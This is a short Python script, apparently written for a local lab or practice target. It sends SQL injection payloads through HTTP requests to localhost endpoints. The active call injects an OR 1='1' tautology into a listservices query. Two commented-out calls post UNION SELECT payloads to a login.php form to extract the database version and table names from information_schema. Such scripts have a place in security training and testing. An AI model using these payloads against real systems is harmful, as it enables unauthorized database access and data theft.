import requests
import urllib.parse

def http_request_inject(method, url, data = None):
    
    if method == "get":
        if data == None:
            response = requests.get(url)
        else:
            response = requests.get(f"{url}?{urllib.parse.urlencode(data)}")
    elif method == "post":
        response = requests.post(url, data=data)
    print(f"Response Code - {response.status_code}")
    print(response.text)
    return response

if __name__ == "__main__":
    http_request_inject("get", "http://127.0.0.1:4000/listservices?category=products%20OR%201=\"1\"%20';%20-- ")
    # http_request_inject("post", "http://localhost:8080/login.php", {"user": "' UNION SELECT CONCAT(\"asd\", @@version, \"asd\"), NULL, NULL, NULL;-- ", "password": "a"})
    # http_request_inject("post", "http://localhost:8080/login.php", {"user": "' UNION select table_name, NULL, NULL, NULL from information_schema.tables where table_name;-- ", "password": "a"})